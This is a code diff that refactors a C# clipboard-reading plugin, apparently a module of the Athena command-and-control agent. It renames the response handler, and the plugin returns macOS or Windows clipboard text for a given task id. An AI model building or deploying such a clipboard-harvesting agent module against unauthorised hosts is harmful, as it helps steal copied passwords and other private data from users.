@@ -1,4 +1,5 @@
-﻿using Athena.Plugins;
+﻿using Athena.Commands;
+using Athena.Commands.Models;
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
@@ -175,20 +176,20 @@ namespace Plugins
             {
                 if (OperatingSystem.IsMacOS())
                 {
-                    PluginHandler.Write(OsxClipboard.GetText(), args["task-id"], true);
+                    TaskResponseHandler.Write(OsxClipboard.GetText(), args["task-id"], true);
                 }
                 else if (OperatingSystem.IsWindows())
                 {
-                    PluginHandler.Write(WindowsClipboard.GetText(), args["task-id"], true);
+                    TaskResponseHandler.Write(WindowsClipboard.GetText(), args["task-id"], true);
                 }
                 else
                 {
-                    PluginHandler.Write("Not implemented on this OS yet.", args["task-id"], true, "error");
+                    TaskResponseHandler.Write("Not implemented on this OS yet.", args["task-id"], true, "error");
                 }
             }
             catch (Exception e)
             {
-                PluginHandler.Write(e.ToString(), args["task-id"], true, "error");
+                TaskResponseHandler.Write(e.ToString(), args["task-id"], true, "error");
                 return;
             }
         }
